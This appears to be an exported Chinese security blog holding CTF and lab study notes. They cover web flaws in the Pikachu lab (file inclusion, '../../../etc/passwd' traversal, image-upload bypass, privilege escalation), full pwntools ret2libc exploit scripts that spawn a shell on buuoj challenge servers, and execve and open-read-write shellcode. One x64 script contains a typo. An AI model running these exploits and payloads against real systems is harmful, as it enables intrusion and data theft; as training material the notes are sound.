<h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><p>​	这种是仅对服务器本地的文件进行包含，因为服务器上的文件并不是攻击者可以自己控制的，所以该种攻击通常是包含系统的配置文件（如密钥文件），或是配合文件上传漏洞去利用。</p>
<p>​	先随便提交一个数据，然后看<code>url</code>可以发现，<code>filename=</code>这个参数存在文件包含漏洞，我们可以通过这个参数访问本地上的其他文件</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131756056.png" alt="image-20241013160223589"></p>
<p>​	在本地查看当前目录，其下有一个<code>file6.php</code>文件，看一下里面的内容，该靶场应该是将该文件作为一个敏感文件</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131756713.png" alt="image-20241013160634171" style="zoom:50%;" />

<p>那么接下来我们便可以通过设置<code>url</code>中的<code>filename=file6.php</code>来获取<code>file6.php</code>文件里的敏感数据</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131756722.png" alt="image-20241013161053618" style="zoom:50%;" />

<h2 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h2><p><strong>原理：</strong></p>
<p>​	一般当我们点击下载链接，便会向后台发送一个下载请求，这个请求会包含一个需要下载的文件名称，后<br>台在收到请求后，会开始执行下载代码，将该文件对应的文件**<em>response</em>** 给浏览器，从而完成下载。<br>​	如果后台在收到请求的文件名后，将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。<br>此时如果攻击者提交的不是一个程序预期的文件名，而是一个精心构造的路径（如<code>../../../etc/passwd</code>），则可能会直接将该指定文件下载下来。从而导致后台敏感信息（密码文件、源代码等）被下载。</p>
<h3 id="防范措施-1"><a href="#防范措施-1" class="headerlink" title="防范措施"></a><strong>防范措施</strong></h3><ul>
<li>对传入的文件名进行严格的过滤和限定</li>
<li>对文件下载的目录进行严格的限定</li>
</ul>
<p>成功下载了<code>flag.txt</code>文件</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131756208.png" alt="image-20241013184458217" style="zoom: 50%;" />

<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize"></a><code>getimagesize</code></h3><p><code>PHP</code>中的<code>getimagesize()</code>函数是一个内置函数，用于获取图像的大小。<code>getimagesize()</code>返回结果中有文件大小和文件类型，如果用这个函数来获取类型，从而判断是否是图片的话，会存在问题。</p>
<p>介绍两个绕过方法：</p>
<ul>
<li>直接伪造头部<code>GIF89A</code></li>
<li>用<code>copy 1.php/a+1.jpg/b 2.jpg</code>命令合成，然后上传<code>2.jpg</code>，再配合文件包含漏洞执行<code>2.jpg</code>中的代码</li>
</ul>
<h2 id="Over-Permission越权"><a href="#Over-Permission越权" class="headerlink" title="Over Permission越权"></a><code>Over Permission</code>越权</h2><p>​	越权漏洞形成的原因是后台使用了 不合理的权限校验规则导致的。一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。</p>
<p>下面来简单认识一下越权操作：</p>
<h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><p>在登录页面登录用户<code>lili</code>的账号</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131756536.png" alt="image-20241015124201596" style="zoom:50%;" />

<p>成功登录后，点击查看个人信息</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131756584.png" alt="image-20241015124215044" style="zoom:50%;" />

<p>此时会向后台提交一个<code>GET</code>请求，并提供了当前用户的用户名，后台便会将当前用户的信息返回到页面</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131806617.png" alt="image-20241015124237973" style="zoom:50%;" />

<p>当我们修改<code>URL</code>中的<code>username</code>参数为另一个用户名<code>kobe</code>时，页面便会出现<code>kobe</code>用户的信息，也就是说我们无需密码便得到了<code>kobe</code>的个人信息，实现了水平越权</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131756191.png" alt="image-20241015124313480" style="zoom:50%;" />

<h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><p>先获取超级用户添加用户的<code>URL</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131756384.png" alt="image-20241015141619677" style="zoom:50%;" />

<p>登录<code>pikachu</code>用户</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131756333.png" alt="image-20241015141746803" style="zoom:50%;" />

<p>直接替换当前页面的<code>URL</code>为前面保存的<code>URL</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131756794.png" alt="image-20241015141905178" style="zoom:50%;" />

<p>现在已经可以通过<code>pikachu</code>用户添加用户          </p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2libc学习总结</title>
    <url>/2023/12/12/ret2libc%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h2><h3 id="什么是ret2libc"><a href="#什么是ret2libc" class="headerlink" title="什么是ret2libc"></a>什么是<code>ret2libc</code></h3><p>​	<code>ret2libc</code>即<code>return to libc</code>，即控制程序中函数的返回地址为<code>libc</code>中函数的地址，进而控制程序执行后门函数，拿到<code>shell</code>。</p>
<p>​	这里有一个公式：函数的真实地址 &#x3D; <code>libc</code>库的基地址 + 函数在<code>libc</code>库的地址偏移</p>
<span id="more"></span>

<h3 id="什么是libc"><a href="#什么是libc" class="headerlink" title="什么是libc"></a>什么是<code>libc</code></h3><p>​	<code>libc</code>是<code>c</code>标准库的二进制文件，里面有常用的<code>c</code>语言函数。                                                      </p>
<h3 id="如何寻找地址偏移量"><a href="#如何寻找地址偏移量" class="headerlink" title="如何寻找地址偏移量"></a>如何寻找地址偏移量</h3><p>法1：</p>
<p>使用命令<code>ldd pwn</code>，查看二进制文件<code>pwn</code>在本地的这个环境上依赖的<code>libc</code>库，<code>/lib/x86_64-linux-gnu/libc.so.6</code>是绝对路径。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132347333.png" alt="image-20240103151448590"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">system_offset = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_offset = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>法2：</p>
<ul>
<li>在程序中寻找字符串的地址</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn3 --string <span class="string">&#x27;sh&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132348729.png" alt="image-20240115152507540"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep <span class="string">&quot;system&quot;</span></span><br><span class="line"><span class="comment">#readelf查找并打印符号表信息</span></span><br><span class="line">strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line"><span class="comment">#string查找并打印字符串信息</span></span><br></pre></td></tr></table></figure>

<p>法3：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;write&quot;</span>,write_addr)  <span class="comment">#查找libc版本</span></span><br><span class="line">system_offset = libc.dump(<span class="string">&#x27;system&#x27;</span>)  <span class="comment">#函数地址偏移量</span></span><br></pre></td></tr></table></figure>

<p>法4：</p>
<p>通过已知的某个<code>libc</code>函数的地址，在<a href="https://libc.blukat.me(`ctrl`+点击/">https://libc.blukat.me（`ctrl`+点击</a> 直接跳转）这个网站中查找到对应的<code>libc</code>数据库，可以直接看到地址偏移量。</p>
<h3 id="这里放一个接收函数地址的方式总结："><a href="#这里放一个接收函数地址的方式总结：" class="headerlink" title="这里放一个接收函数地址的方式总结："></a>这里放一个接收函数地址的方式总结：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">addr = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># p.recvuntil(b&#x27;\n&#x27;)：从输入流中接收数据，直到遇到换行符为止。</span></span><br><span class="line"><span class="comment"># [:-1]：将接收到的数据的最后一个字节（换行符）去除。</span></span><br><span class="line"><span class="comment"># .ljust(8,b&#x27;\0&#x27;)：将剩下的数据用空字节`\0`填充到8字节的长度。s.ljust(width,fillchar)中width为对前面字符串s的填充宽度，fillchar为填充内容。</span></span><br><span class="line"><span class="comment"># u64()：将填充后的8字节数据解析为一个64位的无符号整数。</span></span><br><span class="line">addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>

<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="例题1：buu-铁人三项-第五赛区-2018-rop"><a href="#例题1：buu-铁人三项-第五赛区-2018-rop" class="headerlink" title="例题1：buu 铁人三项(第五赛区)_2018_rop"></a>例题<code>1</code>：<code>buu</code> <code>铁人三项(第五赛区)_2018_rop</code></h3><p>查看保护，只开了<code>NX</code>，</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132347339.png" alt="image-20231222194215373"></p>
<p>明显栈溢出，</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132348996.png" alt="image-20231222193823696"></p>
<p>可以泄漏<code>write</code>函数地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">elf = ELF(<span class="string">&#x27;./2018_rop&#x27;</span>)</span><br><span class="line"><span class="comment">#ELF是pwntools库中的函数，用于加载和分析ELF文件。</span></span><br><span class="line"></span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]  <span class="comment">#获取main函数地址</span></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]  <span class="comment">#获取write函数在plt中的地址</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]  <span class="comment">#获取write函数的got地址，指向got表中write的真实地址</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)  </span><br><span class="line">payload += p32(write_plt)  <span class="comment">#调用write函数</span></span><br><span class="line">payload += p32(main_addr)  <span class="comment">#调用完write后的返回地址，要重新在执行一遍主要函数</span></span><br><span class="line">payload += p32(<span class="number">1</span>)  <span class="comment">#write函数第一个参数，标准输出</span></span><br><span class="line">payload += p32(write_got)  <span class="comment">#第二个参数</span></span><br><span class="line">payload += p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))  <span class="comment">#从接收到的数据中提取一个4字节（32 位）的值</span></span><br><span class="line"><span class="comment">#print(hex(write_addr))</span></span><br></pre></td></tr></table></figure>

<p>同理也可以得到<code>read</code>函数的地址，然后我们可以在<a href="https://libc.blukat.me这个网站上,通过`write,read`函数的地址确定`libc`版本,可直接找到一些函数地址偏移量./">https://libc.blukat.me这个网站上，通过`write,read`函数的地址确定`libc`版本，可直接找到一些函数地址偏移量。</a></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132348032.png" alt="image-20231221203418960"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">```python</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">p = remote(&quot;node4.buuoj.cn&quot;,28149)</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;./2018_rop&#x27;)</span><br><span class="line">#ELF是pwntools库中的函数，用于加载和分析ELF文件。</span><br><span class="line"></span><br><span class="line">main_addr = elf.sym[&#x27;main&#x27;]  #获取main函数地址</span><br><span class="line">write_plt = elf.plt[&#x27;write&#x27;]  #获取write函数在plt中的地址</span><br><span class="line">write_got = elf.got[&#x27;write&#x27;]  #获取write函数的got地址，指向got表中write的真实地址</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*(0x88+4)  </span><br><span class="line">payload += p32(write_plt)  #调用write函数</span><br><span class="line">payload += p32(main_addr)  #调用完write后的返回地址，要重新在执行一遍主要函数</span><br><span class="line">payload += p32(1)  #write函数第一个参数，标准输出</span><br><span class="line">payload += p32(write_got)  #第二个参数</span><br><span class="line">payload += p32(4)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recv(4))  #从接收到的数据中提取一个4字节（32 位）的值</span><br><span class="line">#print(hex(write_addr))</span><br><span class="line"></span><br><span class="line">write_offset = 0x0e56f0</span><br><span class="line">system_offset = 0x03cd10</span><br><span class="line">str_bin_sh_offset = 0x17b8cf</span><br><span class="line"></span><br><span class="line">base_addr = write_addr-write_offset</span><br><span class="line">system_addr = base_addr+system_offset</span><br><span class="line">str_bin_sh_addr = base_addr+str_bin_sh_offset</span><br><span class="line"></span><br><span class="line">payload1 = b&#x27;a&#x27;*(0x88+4)+p32(system_addr)+p32(0)+p32(str_bin_sh_addr)</span><br><span class="line">#p32(0)是调用完system函数后的返回地址，但是因为执行完system后会开启一个子进程阻塞当前的进程，system也就不会返回，所以这里可以放任意地址，但是一定要放地址。</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="例题2：buu-jarvisoj-level3"><a href="#例题2：buu-jarvisoj-level3" class="headerlink" title="例题2：buu jarvisoj_level3"></a>例题<code>2</code>：<code>buu</code> <code>jarvisoj_level3</code></h3><p>看保护，只开了<code>NX</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132348238.png" alt="image-20231222175342689"></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132347523.png" alt="image-20231222175522487"></p>
<p>可以泄漏<code>write</code>函数的地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">elf = ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#这里可以合并成 p.sendlineafter(b&#x27;Input:\n&#x27;,payload)</span></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br></pre></td></tr></table></figure>

<p>这里我在网站上没有找到相应的<code>libc</code>版本，不能直接找到函数地址偏移量，但是<code>buu</code>上的题都给了<code>libc</code>版本</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132348534.png" alt="image-20231222180314290" style="zoom:80%;" />

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132347946.png" alt="image-20231222180348083" style="zoom:80%;" />

<p>知道<code>libc</code>版本后，我们可以通过以下方法找到偏移量</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment">#libc-2.23.so这个ELF文件要在当前目录下存在，直接在buu上下载即可</span></span><br><span class="line"><span class="comment">#这里定义了libc-2.23.so库的一个对象libc</span></span><br><span class="line"></span><br><span class="line">base_addr = write_addr-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = base_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#symbol是libc的一个属性，用于存储 libc 中各个符号（函数、变量等）的地址。</span></span><br><span class="line"></span><br><span class="line">str_bin_sh_addr = base_addr+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="comment">#search()用于在libc中搜索指定字符串的地址。</span></span><br><span class="line"><span class="comment">#next() 是一个内置函数，用于获取一个迭代器的下一个元素。在这里，它用于获取搜索结果中第一个匹配 /bin/sh 的地址。</span></span><br></pre></td></tr></table></figure>

<p><code>exp</code>如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26641</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#这里可以合并成 p.sendlineafter(b&#x27;Input:\n&#x27;,payload)</span></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">base_addr = write_addr-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = base_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">str_bin_sh_addr = base_addr+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="comment">#search()用于在libc中搜索指定字符串的地址。</span></span><br><span class="line"><span class="comment">#next() 是一个内置函数，用于获取一个迭代器的下一个元素。在这里，它用于获取搜索结果中第一个匹配 /bin/sh 的地址。</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system_addr)+p32(<span class="number">0</span>)+p32(str_bin_sh_addr)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="例题3：buu-jarvisoj-level3-x64"><a href="#例题3：buu-jarvisoj-level3-x64" class="headerlink" title="例题3：buu jarvisoj_level3_x64"></a>例题<code>3</code>：<code>buu</code> <code>jarvisoj_level3_x64</code></h3><p>​	该题是<code>64</code>位程序，与第二题只有一处不同。<code>32</code>位通过栈传参，<code>64</code>位通过寄存器传参。故在<code>write</code>函数泄漏和调用<code>system</code>函数的时候需要用寄存器传参。储存参数的前三个寄存器分别为<code>rdi,rsi,rdx</code>。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132348901.png" alt="image-20231222200640812"></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132347028.png" alt="image-20231222200701146"></p>
<p>​	我只找到了前两个寄存器对应的<code>gadget</code>地址，但是这里我们可以利用<code>rdx</code>中的残留值，我们可以看到<code>read</code>调用前，<code>rdx</code>依然保留上一个<code>write</code>函数的参数<code>0x200</code>。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132348407.png" alt="image-20240308135618147" style="zoom: 67%;" />

<p><code>exp</code>如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level3_x64&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26311</span>)</span><br><span class="line"><span class="comment">#context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">rdi_addr = <span class="number">0x4006b3</span></span><br><span class="line">rsi_addr = <span class="number">0x4006b1</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(rdi_addr)+p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(rsi_addr)+p64(write_got)+p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#因为这里的rsi_addr的地址是pop rsi ; pop r15 ; ret，所以需要有一个p64(0)被放入r15寄存器中</span></span><br><span class="line">payload += p64(write_plt)+p64(mian_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">base_addr = write_addr-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = base_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">str_bin_sh_addr = base_addr+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(rdi_addr)+p64(str_bin_sh_addr)+p64(system_addr)+p64(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pwn学习总结</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2shellcode学习总结</title>
    <url>/2023/12/09/ret2shellcode%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="什么是ret2shellcode"><a href="#什么是ret2shellcode" class="headerlink" title="什么是ret2shellcode"></a>什么是<code>ret2shellcode</code></h3><p>​	<code>ret2shellcode</code>，即<code>return to shellcode</code>意思是劫持函数返回地址为<code>shellcode</code>的地址，进而控制程序执行<code>shellcode</code>，拿到<code>shell</code>。</p>
<h3 id="NX保护"><a href="#NX保护" class="headerlink" title="NX保护"></a><code>NX</code>保护</h3><span id="more"></span>

<blockquote>
<p>​	<strong><code>NX</code>保护：将数据（堆，栈）所在内存页标识为不可执行，当程序溢出成功转入<code>shellcode</code>时，程序会尝试在数据页面上执行指令，此时<code>cpu</code>就会抛出异常，而不是去执行恶意指令。</strong></p>
</blockquote>
<h4 id="mprotect函数"><a href="#mprotect函数" class="headerlink" title="mprotect函数"></a><code>mprotect</code>函数</h4><ul>
<li><p>开启了<code>NX</code>保护，内存页不能执行。如果能在程序中找到<code>mprotect</code>函数，我们便可利用该函数修改内存页的访问权限，然后便可在内存页写入<code>shellcode</code>，获得<code>shell</code>。</p>
</li>
<li><p>下面是<code>mprotect</code>函数原型</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mprotect</span><span class="params">(<span class="type">void</span> *addr,<span class="type">size_t</span> len,<span class="type">int</span> prot)</span>;</span><br><span class="line"><span class="comment">//addr指向要修改的内存页的起始地址，一个内存页大小为4096(0x1000)字节</span></span><br><span class="line"><span class="comment">//len是要修改的内存长度（以字节为单位）</span></span><br><span class="line"><span class="comment">//prot表示要修改成什么权限（4，2，1 可读可写可执行）</span></span><br></pre></td></tr></table></figure>

<ul>
<li>在<code>ida</code>中<code>Ctrl+s</code>可以查看各个段的起始地址</li>
</ul>
<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a><code>shellcode</code></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">execve(<span class="string">&quot;/bin/sh&quot;</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">open(flag_addr,<span class="number">0</span>)</span><br><span class="line">    <span class="comment">//flag_addr是要打开文件的地址</span></span><br><span class="line">read(<span class="number">3</span>,addr,<span class="number">0x50</span>)</span><br><span class="line">    <span class="comment">//一个进程有默认的文件描述符0，1，2。当打开一个新的文件后，新文件的文件描述符就是3，后面再打开的文件的文件描述符以此类推</span></span><br><span class="line">    <span class="comment">//addr可以是任意普通地址</span></span><br><span class="line">    <span class="comment">//0x50是要读的内容的大小</span></span><br><span class="line">write(<span class="number">1</span>,addr,<span class="number">0x50</span>)</span><br><span class="line">    <span class="comment">//文件描述符0，1，2 分别是：标准输入，标准输出，标准错误</span></span><br><span class="line">    <span class="comment">//这里的addr要与read函数中的addr一样</span></span><br></pre></td></tr></table></figure>

<h4 id="32位"><a href="#32位" class="headerlink" title="32位"></a><code>32</code>位</h4><p>​	系统调用存储参数的前<code>3</code>个寄存器：<code>ebx,ecx,edx</code>，函数的系统调用号可在<code>/usr/include/x86_64-linux-gnu/asm/unistd_32.h</code>文件中查看，<code>eax</code>存储系统调用号，执行<code>int 0x80</code>指令进行系统调用。</p>
<h5 id="execve"><a href="#execve" class="headerlink" title="execve"></a><code>execve</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor ecx,ecx </span><br><span class="line">xor edx,edx</span><br><span class="line">xor ebx,ebx ;ebx中现在为0</span><br><span class="line">push ebx ;先把一个0压入栈，用来截断字符串</span><br><span class="line">push 0x68732f2f ;把//sh压入栈</span><br><span class="line">push 0x6e69622f ;把/bin压入栈</span><br><span class="line">mov ebx,esp ;把esp指向的地址赋给了ebx，此时ebx中放的是/bin//sh的地址</span><br><span class="line">push 11</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>

<p>这里放一张师父的图片，有助于理解怎么把<code>/bin//sh</code>的地址放入<code>ebx</code>中</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132353394.png" alt="image-20230926230802945"></p>
<h5 id="open-read-write"><a href="#open-read-write" class="headerlink" title="open_read_write"></a><code>open_read_write</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push 0</span><br><span class="line">push 0x67616c66</span><br><span class="line">push esp</span><br><span class="line">pop ebx</span><br><span class="line">xor ecx,ecx</span><br><span class="line">push 5</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br><span class="line">push eax</span><br><span class="line">pop ebx</span><br><span class="line">push esp </span><br><span class="line">pop ecx</span><br><span class="line">push 0x50</span><br><span class="line">pop edx</span><br><span class="line">push 3</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br><span class="line">push 1</span><br><span class="line">pop ebx</span><br><span class="line">push esp</span><br><span class="line">pop ecx</span><br><span class="line">push 0x50</span><br><span class="line">pop edx</span><br><span class="line">push 4</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>



<h4 id="64位"><a href="#64位" class="headerlink" title="64位"></a><code>64</code>位</h4><p>​	系统调用存储参数的前<code>6</code>个寄存器：<code>rdi,rsi,rdx,r10,r8,r9</code>，函数的系统调用号可在<code>/usr/include/x86_64-linux-gnu/asm/unistd_64.h</code>文件中查看，<code>rax</code>存储系统调用号，执行<code>syscall</code>指令进行系统调用。</p>
